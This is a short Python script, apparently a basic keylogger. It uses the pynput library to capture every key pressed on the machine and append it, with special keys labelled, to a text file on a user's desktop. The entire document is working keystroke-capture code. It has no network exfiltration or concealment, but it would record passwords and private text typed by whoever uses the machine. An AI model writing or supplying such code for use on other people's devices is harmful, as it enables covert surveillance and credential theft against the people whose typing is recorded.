from pynput.keyboard import Listener, Key

# Function to save the typed keys to a file
def save_typed_info(key):
    try:
        # Check if the key is a special key
        if isinstance(key, Key):
            if key == Key.space:
                key_str = ' '  # Space key
            elif key == Key.enter:
                key_str = '\n'  # Enter key (new line)
            elif key == Key.shift:
                key_str = '[Shift]'  # Shift key
            elif key == Key.ctrl_l or key == Key.ctrl_r:
                key_str = '[Ctrl]'  # Ctrl key
            elif key == Key.alt_l or key == Key.alt_r:
                key_str = '[Alt]'  # Alt key
            elif key == Key.caps_lock:
                key_str = '[CapsLock]'  # CapsLock key
            else:
                key_str = f'[{key}]'  # Other special keys
        else:
            # Handle regular alphanumeric keys
            key_str = str(key).replace("'", "")  # Clean up the string

        # Write the key to a file
        with open('/home/zone/Desktop/Data.txt', 'a') as file:
            file.write(key_str)

    except Exception as e:
        print(f"Error: {e}")

# Driver code to listen to keyboard events
with Listener(on_press=save_typed_info) as listener:
    listener.join()
